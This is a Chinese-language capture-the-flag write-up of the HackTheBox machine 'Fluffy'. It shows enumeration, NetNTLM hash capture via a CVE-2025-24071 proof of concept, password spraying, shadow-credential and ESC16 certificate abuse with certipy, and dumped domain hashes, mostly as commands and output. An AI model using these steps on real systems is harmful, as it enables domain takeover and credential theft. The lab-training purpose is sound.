---
title: Fluffy # 从 Astro 的 title 转换
date: 2025/05/28 15:28:31 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)
description: '[HTB_Fluffy] | ESC16的利用以及权限的熟悉' # 从 Astro 的 description 转换
cover: /images/Fluffy.png # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - 渗透测试
  - Windows提权
  - certipy
  - nxc
  - 权限总结
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - Writeup
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# published: true # 对应 Astro 的 draft: false。在 Hexo 中，默认就是发布的，不需要这个字段。草稿文章通常放在 _drafts 文件夹。
# lang: 'zh' # Redefine 主题支持多语言配置，但通常在主题的 _config.yml 中配置，而非单篇文章。如果你有特殊需求，可以在文章中设置，但一般不常用。
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
password: 8da83a3fa618b6e3a00e93f676c92a6e # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
toc: true 
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---
靶机提供初始凭证` j.fleischman / J0elTHEM4n1990!`

## Enum

### Nmap

```bash
# Nmap 7.94SVN scan initiated Sun May 25 01:23:01 2025 as: nmap -sT -O -A -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49681,49695,49701,49738 -oA ./nmapscan/details 10.10.11.69
Nmap scan report for 10.10.11.69
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 12:02:16Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h38m56s, deviation: 0s, median: 6h38m56s
| smb2-time: 
|   date: 2025-05-25T12:03:27
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   110.54 ms 10.10.16.1
2   202.93 ms 10.10.11.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 25 01:25:07 2025 -- 1 IP address (1 host up) scanned in 126.19 seconds

```

### ldap

```bash
└─$ ldapsearch -H ldap://10.10.11.69 -s base -x
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=fluffy,DC=htb
ldapServiceName: fluffy.htb:dc01$@FLUFFY.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fluffy,DC=htb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=fluffy,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=fluffy,DC=htb
namingContexts: DC=fluffy,DC=htb
namingContexts: CN=Configuration,DC=fluffy,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=fluffy,DC=htb
namingContexts: DC=DomainDnsZones,DC=fluffy,DC=htb
namingContexts: DC=ForestDnsZones,DC=fluffy,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 217274
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=fluffy,DC=htb
dnsHostName: DC01.fluffy.htb
defaultNamingContext: DC=fluffy,DC=htb
currentTime: 20250528115408.0Z
configurationNamingContext: CN=Configuration,DC=fluffy,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

## To User

### NXC

#### 利用提供的凭据探测smb

```bash
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```

发现对IT目录有**读写权限**

#### rid-brute得到用户列表

{% folding blue::UserList %} 

Administrator
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman

{% endfolding %}

随后进行密码喷洒无结果

### SMB

重点去看smb有什么东西

smclient连进去之后发现有一个pdf文档

```bash
└─$ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman
Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 28 07:56:45 2025
  ..                                  D        0  Wed May 28 07:56:45 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  important.lnk                       A     2164  Wed May 28 07:45:09 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1831331 blocks available

```

查看内容管理员通知要及时去修复以下CVE对应的漏洞

得知可能存在以下漏洞

![image-20250528132359918](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250528132359918.png)

进一步检索发现CVE-2025-24071可利用[poc](https://github.com/Marcejr117/CVE-2025-24071_PoC)

按照readme中的利用方法我们先启动一个responder用于接收NetNTLMhash。然后指定文件名来生成exploit.zip文件，之后将生成的文件放到smb中等待用户解压读取。

完成利用后能得到一串NetNTLMhash

```bash
p.agila::FLUFFY:9484d2df6a2ad247:9A66EA4C1AEB32DACD1ADD7587732187:0101000000000000806886CC50CDDB01A92A952DAE8409730000000002000800570057005400450001001E00570049004E002D004F004C0048005700570053004F0034004D004A00550004003400570049004E002D004F004C0048005700570053004F0034004D004A0055002E0057005700540045002E004C004F00430041004C000300140057005700540045002E004C004F00430041004C000500140057005700540045002E004C004F00430041004C0007000800806886CC50CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310039000000000000000000
```

将哈希发到hashcat中破解可得到对应密码`prometheusx-303`

继续进行密码喷洒

```bash
└─$ nxc smb 10.10.11.69 -u rid_user.list -p 'prometheusx-303' --continue-on-success
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\Administrator:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\Guest:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\krbtgt:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\DC01$:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\ca_svc:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\ldap_svc:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\winrm_svc:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.coffey:prometheusx-303 STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.fleischman:prometheusx-303 STATUS_LOGON_FAILURE 
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ nxc winrm 10.10.11.69 -u rid_user.list -p 'prometheusx-303' --continue-on-success
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\Administrator:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\Guest:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\krbtgt:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\DC01$:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\ca_svc:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\ldap_svc:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\winrm_svc:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.coffey:prometheusx-303
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:prometheusx-303
```

可以发现，该用户依然没有winrm权限。

### bloodhound

利用得到的用户凭据进去遛狗

![image-20250528133730489](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250528133730489.png)

可以发现这样一条路径

当前用户对service account组有完全控制权限，这个组又对winrm_svc用户genericwrite权限。

所以接下来的方向很简单，利用对组的控制将自身加组，加组后就能对winrm_svc创建shadow credential进而获得控制权。

#### 加组

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts
```

#### shadow credential

```bash
└─$ certipy -debug shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc -target-ip 10.10.11.69                                                      
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: None
[+] DC IP: None
[+] DC Host: 'FLUFFY.HTB'
[+] Target IP: '10.10.11.69'
[+] Remote Name: '10.10.11.69'
[+] Domain: 'FLUFFY.HTB'
[+] Username: 'P.AGILA'
[+] Trying to resolve 'FLUFFY.HTB' at '192.168.0.2'
[+] Authenticating to LDAP server using NTLM authentication
[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
[+] Using LDAP channel binding for NTLM authentication
[+] LDAP NTLM authentication successful
[+] Bound to ldaps://10.10.11.69:636 - ssl
[+] Default path: DC=fluffy,DC=htb
[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '574a27f7-6fca-f9ee-c0ff-071b052a7f21'
<KeyCredential structure at 0x7fed136a7110>
  | Owner: CN=winrm service,CN=Users,DC=fluffy,DC=htb
  | Version: 0x200
  | KeyID: P5JDrgpSp9lhREFDIpPEqazQBOAn3pvjkWT4b/Zjhsc=
  | KeyHash: 219392ff48b87cdc9e114b2dd388bdb2cbbbd8993713697680cc7fa7472b0a33
  | RawKeyMaterial: <dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7fed136a6e90>
  |  | Exponent (E): 65537
  |  | Modulus (N): 0xd677b5479779f5772dc8fb84f04f9b873b7a083b6712f16c422539dc8196b52537fc12f08a68e2db3f1a2199d504f1507aaec2a0b94199bc8388464963a5ddc9949c8d8b0574f7fead97879eaf7c6cc029945376e24caa3a623ab5405826a230f83a31c5c36be4286297667d80ee3c622118d3da692af6173368f3db0676bcc20a0ed57c10ee5282eafcf515f4893ab9b171a05bcace5dc23f89efb8ea039328bd689a4cf19297a63528872a7faa139bcc1bfd7b76a473569597f985ed6891f0a52c3baa6a5ddddde6df0f707964ec3e65c44f0752108d94c606b2a753a53406c2cdf1561da75fdfc48ed20817912f8042fa0f773bebc52bd8846c898bab8513
  |  | Prime1 (P): 0x0
  |  | Prime2 (Q): 0x0
  | Usage: KeyUsage.NGC
  | LegacyUsage: None
  | Source: KeySource.AD
  | DeviceId: 574a27f7-6fca-f9ee-c0ff-071b052a7f21
  | CustomKeyInfo: <CustomKeyInformation at 0x7fed133658b0>
  |  | Version: 1
  |  | Flags: KeyFlags.NONE
  |  | VolumeType: None
  |  | SupportsNotification: None
  |  | FekKeyVersion: None
  |  | Strength: None
  |  | Reserved: None
  |  | EncodedExtendedCKI: None
  | LastLogonTime (UTC): 2025-05-28 13:45:01.791393
  | CreationTime (UTC): 2025-05-28 13:45:01.791393
[*] Adding Key Credential with device ID '574a27f7-6fca-f9ee-c0ff-071b052a7f21' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '574a27f7-6fca-f9ee-c0ff-071b052a7f21' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC fluffy.htb (10.10.11.69)
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[+] Attempting to write data to 'winrm_svc.ccache'
File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[+] Data written to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

### winrm login

登录拿到user.hash

```bash
└─$ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 

```

## To Root

用同样的方法获得ca_svc的权限，然后用certipy来查看攻击路径。

```bash
└─$ cat 20250528095524_Certipy.txt                                                                                                                                                                                                                                                                                                                                                       
Certificate Authorities                                                                       
  0                                                                                           
    CA Name                             : fluffy-DC01-CA                                                                                                                                    
    DNS Name                            : DC01.fluffy.htb                                                                                                                                   
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb                                                                                                              
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5                                                                                                                  
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00                                                                                                                         
    Certificate Validity End            : 3024-04-17 16:11:16+00:00                                                                                                                         
    Web Enrollment                                                                            
      HTTP                                                                                    
        Enabled                         : False                                               
      HTTPS                                                                                   
        Enabled                         : False                                               
    User Specified SAN                  : Disabled                                            
    Request Disposition                 : Issue                                               
    Enforce Encryption for Requests     : Enabled                                             
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                      
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2                                                                                                                              
    Permissions                                                                               
      Owner                             : FLUFFY.HTB\Administrators                                                                                                                         
      Access Rights                                                                           
        ManageCa                        : FLUFFY.HTB\Domain Admins                                                                                                                          
                                          FLUFFY.HTB\Enterprise Admins                                                                                                                      
                                          FLUFFY.HTB\Administrators                                                                                                                         
        ManageCertificates              : FLUFFY.HTB\Domain Admins                                                                                                                          
                                          FLUFFY.HTB\Enterprise Admins                                                                                                                      
                                          FLUFFY.HTB\Administrators                                                                                                                         
        Enroll                          : FLUFFY.HTB\Cert Publishers                                                                                                                        
    [!] Vulnerabilities                                                                       
      ESC16                             : Security Extension is disabled.                                                                                                                   
    [*] Remarks                                                                               
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.  
```

可以发现能够利用ESC16

去翻看certipy的wiki可以看到完整的利用方式和原理

> **Scenario A: UPN Manipulation (Requires `StrongCertificateBindingEnforcement = 1` (Compatibility) or `0` (Disabled) on DCs, and attacker has write access to a "victim" account's UPN)
> 场景 A：UPN 操纵（需要在 DC 上启用 `StrongCertificateBindingEnforcement = 1` （兼容性）或 `0` （禁用），且攻击者对"受害者"账户的 UPN 有写入权限）**
>
> Attacker (`attacker@corp.local`) has `GenericWrite` permission over a "victim" account (`victim@corp.local`). The `victim` account can enroll in *any suitable client authentication template* (e.g., the default "User" template) on the ESC16-vulnerable CA. The target for impersonation is `administrator@corp.local`.
> 攻击者( `attacker@corp.local` )对"受害者"账户( `victim@corp.local` )拥有 `GenericWrite` 权限。 `victim` 账户可以注册 ESC16 易受攻击 CA 上任何合适的客户端认证模板（例如默认的"用户"模板）。目标是 `administrator@corp.local` 。
>
> - **Step 1: Read initial UPN of the victim account (Optional - for restoration).
>   步骤 1：读取受害者账户的初始 UPN（可选——用于恢复）。**
>
>   ```
>   certipy account \
>       -u 'attacker@corp.local' -p 'Passw0rd!' \
>       -dc-ip '10.0.0.100' -user 'victim' \
>       read
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   
>   [*] Reading attributes for 'victim':
>       cn                                  : Victim
>       userPrincipalName                   : victim@CORP.LOCAL
>   ...
>   ```
>
>   
>
> - **Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.
>   步骤 2：将受害者账户的 UPN 更改为目标管理员的 `sAMAccountName` 。**
>
>   ```
>   certipy account \
>       -u 'attacker@corp.local' -p 'Passw0rd!' \
>       -dc-ip '10.0.0.100' -upn 'administrator' \
>       -user 'victim' update
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   
>   [*] Updating user 'victim':
>       userPrincipalName                   : administrator
>   [*] Successfully updated 'victim'
>   ```
>
>   
>
> - **Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).
>   步骤 3：（如有必要）获取“受害者”账户的凭证（例如，通过影子凭证）。**
>
>   ```
>   certipy shadow \
>       -u 'attacker@corp.local' -p 'Passw0rd!' \
>       -dc-ip '10.0.0.100' -account 'victim' \
>       auto
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   ...
>   [*] Saving credential cache to 'victim.ccache'
>   [*] Wrote credential cache to 'victim.ccache'
>   [*] NT hash for 'victim': fc525c9683e8fe067095ba2ddc971889
>   ```
>
>   
>
> - **Step 4: Request a certificate as the "victim" user from \*any suitable client authentication template\* (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):
>   第 4 步：从 ESC16-vulnerable CA 的任何合适的客户端认证模板（例如"User"）中，以"victim"用户身份请求证书。由于该 CA 存在 ESC16 漏洞，它将自动从签发的证书中省略 SID 安全扩展，而不管该扩展在模板中的具体设置如何。设置 Kerberos 凭证缓存环境变量（shell 命令）：
>
>   ```
>   export KRB5CCNAME=victim.ccache
>   ```
>
>   
>
>   Then request the certificate:
>   然后请求证书：
>
>   ```
>   certipy req \
>       -k -dc-ip '10.0.0.100' \
>       -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
>       -template 'User'
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   
>   [*] Requesting certificate via RPC
>   [*] Request ID is 1
>   [*] Successfully requested certificate
>   [*] Got certificate with UPN 'administrator@corp.local'
>   [*] Certificate has no object SID
>   [*] Try using -sid to set the object SID or see the wiki for more details
>   [*] Saving certificate and private key to 'administrator.pfx'
>   [*] Wrote certificate and private key to 'administrator.pfx'
>   ```
>
>   
>
> - **Step 5: Revert the "victim" account's UPN.
>   步骤 5：恢复“受害者”账户的 UPN。**
>
>   ```
>   certipy account \
>       -u 'attacker@corp.local' -p 'Passw0rd!' \
>       -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
>       -user 'victim' update
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   
>   [*] Updating user 'victim':
>       userPrincipalName                   : victim@corp.local
>   [*] Successfully updated 'victim'
>   ```
>
>   
>
> - **Step 6: Authenticate as the target administrator.
>   第六步：以目标管理员身份进行认证。**
>
>   ```
>   certipy auth \
>       -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
>       -username 'administrator' -domain 'corp.local'
>   ```
>
>   
>
>   **Expected Output Snippet: 预期输出片段：**
>
>   ```text
>   Certipy v5.0.0 - by Oliver Lyak (ly4k)
>   
>   [*] Certificate identities:
>   [*]     SAN UPN: 'administrator'
>   [*] Using principal: 'administrator@corp.local'
>   [*] Trying to get TGT...
>   [*] Got TGT
>   [*] Saving credential cache to 'administrator.ccache'
>   [*] Wrote credential cache to 'administrator.ccache'
>   [*] Trying to retrieve NT hash for 'administrator'
>   [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
>   ```
>
>   
>
>   Note the `Certificate identities` list only shows `SAN UPN: 'administrator'`, confirming the absence of any SID extensions in this certificate.
>   注意 `Certificate identities` 列表仅显示 `SAN UPN: 'administrator'` ，确认此证书中不存在任何 SID 扩展。

完整利用后可得到administrator的hash，winrm登录后即可得到root.hash

```powershell
                                                                            
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::                      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                     FLUFFY\DC01$:aes256-cts-hmac-sha1-96:34b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751       FLUFFY\DC01$:aes128-cts-hmac-sha1-96:19a1dd430a92c3568f04814342d8e486                                       FLUFFY\DC01$:des-cbc-md5:ec13a85edf688a85                          
FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e2647
